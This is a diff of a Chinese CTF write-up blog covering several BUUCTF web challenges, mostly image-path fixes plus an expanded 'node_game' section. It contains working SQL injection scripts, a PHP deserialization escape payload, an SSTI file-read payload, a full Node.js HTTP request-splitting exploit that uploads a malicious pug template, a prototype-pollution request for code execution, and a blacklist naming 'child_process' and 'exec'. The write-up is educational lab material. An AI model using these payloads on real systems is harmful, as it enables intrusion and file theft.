@@ -13,7 +13,7 @@ tags:
 
 <!--more-->
 
-![](../pic/107.png)
+![](/pic/107.png)
 
 简单的注册admin,admin登入，发现在Profile界面发现存在~~xss~~slelf-xss 还有一个admin界面，提示需要admin才能访问，不过只能获取自己cookie。这是一个坑。
 
@@ -21,7 +21,7 @@ tags:
 
 后面想到登入界面可能存在注入,经过测试确实存在sql注入
 
-![](../pic/109.png)
+![](/pic/109.png)
 
 编写脚本，在里面有坑，编码不一样
 
@@ -130,7 +130,7 @@ get_data('flaaag','flag') #flag{04418836-27b8-4f85-8c53-74f7e3e53350}
 
 题目给出了源码，经过测试过滤了如下字符
 
-![](../pic/110.png)
+![](/pic/110.png)
 
 附上脚本
 
@@ -583,7 +583,7 @@ echo serialize($a);
 
 使用相应长度的字符逃逸
 
-```
+```http
 age=&nickname=******************************************************************************************flagflag";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";s:0:"";s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}
 ```
 
@@ -725,7 +725,7 @@ get_data('flag','table1')
 
 测试时发现
 
-```
+```php
 preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
 ```
 
@@ -837,11 +837,11 @@ payload：1'; handler FlagHere open; handler FlagHere read first; handler FlagHe
 
  是一个提交窗口，经过测试过滤了如下字符0
 
-![](../pic/111.png)
+![](/pic/111.png)
 
 后面又测试了一次，发现单独的or没有被过滤，*or就被过滤了
 
-![](../pic/112.png)
+![](/pic/112.png)
 
 information_schema.tables可以使用`sys.schema_table_statistics_with_buffer`或`sys.schema_table_statistics_with_buffer`代替。
 
@@ -990,7 +990,7 @@ def decode():
 
 是模板注入，然后还有一个过滤，还能打开python交互界面但是有密码
 
-![](../pic/114.png)
+![](/pic/114.png)
 
 任意文件读取
 
@@ -1002,7 +1002,7 @@ e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9f
 
 结果为
 
-![](../pic/115.png)
+![](/pic/115.png)
 
 提取/app/app.py所有代码
 
@@ -1204,66 +1204,74 @@ print(rv)
 
 # node_game
 
-打开题目有两个选择
+经过查找资料，本题是改自于hackim-2020，[出题师傅博客](http://blog.5am3.com/2020/02/11/ctf-node1/)
 
-![](../pic/117.png)
+**题目提示 node 版本为8.12.0**
+
+打开题目有两个选项
+
+![](/pic/117.png)
 
 选择Only admin can use this
 
 是一个文件上传的界面
 
-![](../pic/116.png)
+![](/pic/116.png)
 
-选择Click here to get the source查看源码
+选择Click here to get the source可以查看源码，总共有四条路由和一个黑名单函数
 
-````js
-var express = require('express');
-var app = express();
-var fs = require('fs');
-var path = require('path');
-var http = require('http');
-var pug = require('pug');
-var morgan = require('morgan');
-const multer = require('multer');
+黑名单函数检测下列字符
 
+```
+"global","process","mainModule","require","root","child_process","exec","\"","'","!"
+```
 
-app.use(multer({dest: './dist'}).array('file'));
-app.use(morgan('short'));
-app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
-app.use("/template",express.static(path.join(__dirname, '/template')))
+根路由是获取pug文件渲染后的页面
 
-
+```js
 app.get('/', function(req, res) {
     var action = req.query.action?req.query.action:"index";
-    if( action.includes("/") || action.includes("\\") ){
+    if( action.includes("/") || action.includes("\\") ){   //action不能包含 ‘/’和‘\\’
         res.send("Errrrr, You have been Blocked");
     }
     file = path.join(__dirname + '/template/'+ action +'.pug');
     var html = pug.renderFile(file);
     res.send(html);
 });
+```
 
+一条是显示源码
+
+```js
+app.get('/source', function(req, res) {
+    res.sendFile(path.join(__dirname + '/template/source.txt'));
+});
+```
+
+一条是上传文件
+
+```js
 app.post('/file_upload', function(req, res){
     var ip = req.connection.remoteAddress;
     var obj = {
         msg: '',
     }
-    if (!ip.includes('127.0.0.1')) {
+    if (!ip.includes('127.0.0.1')) {   //保证地址是127.0.0.1
         obj.msg="only admin's ip can use it"
         res.send(JSON.stringify(obj));
         return 
     }
-    fs.readFile(req.files[0].path, function(err, data){
+    fs.readFile(req.files[0].path, function(err, data){   //读取文件内容，读取的数据放到data中
         if(err){
-            obj.msg = 'upload failed';
-            res.send(JSON.stringify(obj));
+            obj.msg = 'upload failed';  
+            res.send(JSON.stringify(obj));   //如果读取失败，返回upload failed
         }else{
-            var file_path = '/uploads/' + req.files[0].mimetype +"/";
-            var file_name = req.files[0].originalname
+            var file_path = '/uploads/' + req.files[0].mimetype +"/";   //file_path为 /uploads/ 加上上传时的Content-Type
+            var file_name = req.files[0].originalname   //file_name为上传时的文件名
             var dir_file = __dirname + file_path + file_name
-            if(!fs.existsSync(__dirname + file_path)){
+            if(!fs.existsSync(__dirname + file_path)){  
                 try {
-                    fs.mkdirSync(__dirname + file_path)
+                    fs.mkdirSync(__dirname + file_path)  //检查路径是否存在，如果不存在就创建 
                 } catch (error) {
                     obj.msg = "file type error";
                     res.send(JSON.stringify(obj));
@@ -1271,7 +1279,7 @@ app.post('/file_upload', function(req, res){
                 }
             }
             try {
-                fs.writeFileSync(dir_file,data)
+                fs.writeFileSync(dir_file,data)  //向上传的文件中写入数据
                 obj = {
                     msg: 'upload success',
                     filename: file_path + file_name
@@ -1283,33 +1291,33 @@ app.post('/file_upload', function(req, res){
         }
     })
 })
+```
 
-app.get('/source', function(req, res) {
-    res.sendFile(path.join(__dirname + '/template/source.txt'));
-});
+还有一条是代理访问`http://localhost:8081/source`
+这一条就刚好解决了文件上传的IP不是127.0.0.1的问题。
 
-
+```js
 app.get('/core', function(req, res) {
-    var q = req.query.q;
+    var q = req.query.q;  //获取参数q
     var resp = "";
     if (q) {
-        var url = 'http://localhost:8081/source?' + q
+        var url = 'http://localhost:8081/source?' + q  
         console.log(url)  //终端打印url
-        var trigger = blacklist(url);
-        if (trigger === true) {
-            res.send("<p>error occurs!</p>");
+        var trigger = blacklist(url);  
+        if (trigger === true) {   
+            res.send("<p>error occurs!</p>");   //url中不能包含黑名单中字符，也就是参数q不能包含
         } else {
             try {
                 http.get(url, function(resp) {
                     resp.setEncoding('utf8');
-                    resp.on('error', function(err) {
+                    resp.on('error', function(err) {  //处理response流中的error事件
                     if (err.code === "ECONNRESET") {
                      console.log("Timeout occurs");
                      return;
                     }
                    });
 
-                    resp.on('data', function(chunk) {
+                    resp.on('data', function(chunk) {   ////处理response流中的data事件
                         try {
                          resps = chunk.toString();
                          res.send(resps);
@@ -1329,42 +1337,72 @@ app.get('/core', function(req, res) {
     }
 })
 
-function blacklist(url) {    //定义黑名单
-    var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
-    var arrayLen = evilwords.length;
-    for (var i = 0; i < arrayLen; i++) {
-        const trigger = url.includes(evilwords[i]);
-        if (trigger === true) {
-            return true
-        }
-    }
-}
-
-var server = app.listen(8081, function() {
-    var host = server.address().address
-    var port = server.address().port
-    console.log("Example app listening at http://%s:%s", host, port)  //在终端打印信息
-})
-
-````
-
-得知大概是要通过ssrf上传包含flag的pug文件拿到flag
-
-在文件上传界面中，要保证地址是127.0.0.1
-
-```js
-var ip = req.connection.remoteAddress;
-var obj = {
-     msg: '',
-}
-if (!ip.includes('127.0.0.1')) {
-     obj.msg="only admin's ip can use it"
-     res.send(JSON.stringify(obj));
-     return 
- }
 ```
 
+题目提示了node版本，搜索发现  此版本的http.get存在漏洞
+https://xz.aliyun.com/t/2894#toc-2
 
+翻阅pug文档https://pugjs.bootcss.com/language/includes.html
+
+包含flag文件
+
+```
+doctype html
+html
+  head
+    style
+      include ../../../../../../../../../../../flag.txt
+```
+
+使用文件上传路由，然后抓包，再修改一下
+
+>尝试自己编写脚本，但是一直报错，待更新
+
+
+
+附上赵师傅的脚本
+
+```python
+import urllib.parse
+import requests
+
+payload = ''' HTTP/1.1
+Host: x
+Connection: keep-alive
+
+POST /file_upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
+Connection: keep-alive
+cache-control: no-cache
+Host: x
+Content-Length: 292
+
+----------------------------919695033422425209299810
+Content-Disposition: form-data; name="file"; filename="glzjin.pug"
+Content-Type: /../template
+
+doctype html
+html
+  head
+    style
+      include ../../../../../../../flag.txt
+
+----------------------------919695033422425209299810--
+
+GET /flag HTTP/1.1
+Host: x
+Connection: close
+x:'''
+payload = payload.replace("\n", "\r\n")
+payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
+print(payload)
+r = requests.get('http://3bfb563e-08fd-4430-80c9-4619b1f703e9.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))
+print(r.text)
+
+r = requests.get(url+'/?action=glzjin')
+print(r.text)
+
+```
 
 
 
@@ -1382,11 +1420,11 @@ if (!ip.includes('127.0.0.1')) {
 
 打开题目是一个登录界面
 
-![](../pic/127.png)
+![](/pic/127.png)
 
 随意输入一下看看404有什么东西，得到了网页的绝对地址/app
 
-![](../pic/130.png)
+![](/pic/130.png)
 
 扫描发现有源码www.zip,先查看route下的源码
 
@@ -1442,7 +1480,7 @@ router.post('/login', function (req, res) {
 
 merge、clone 可能触发原型链污染（暂时没有弄懂为什么会造成原型链污染）https://xz.aliyun.com/t/7184#toc-5
 
-```
+```js
 router.post('/action', function (req, res) {
   if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
   req.session.user.data = clone(req.body);
@@ -1457,7 +1495,7 @@ router.get('/info', function (req, res) {
 
 传入可造成任意代码执行的数据，提示已经给出，flag在/flag文件中，由于无法显示出来，所以将内容输出到文件，路径已经从404报错页面得到，框架对外显示的路径都是/public/
 
-```
+```http
 POST /action HTTP/1.1
 Host: f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
@@ -1477,7 +1515,7 @@ Content-Length: 133
 
 访问/info触发代码执行
 
-![](../pic/129.png)
+![](/pic/129.png)
 
 访问/a.txt得到flag
 
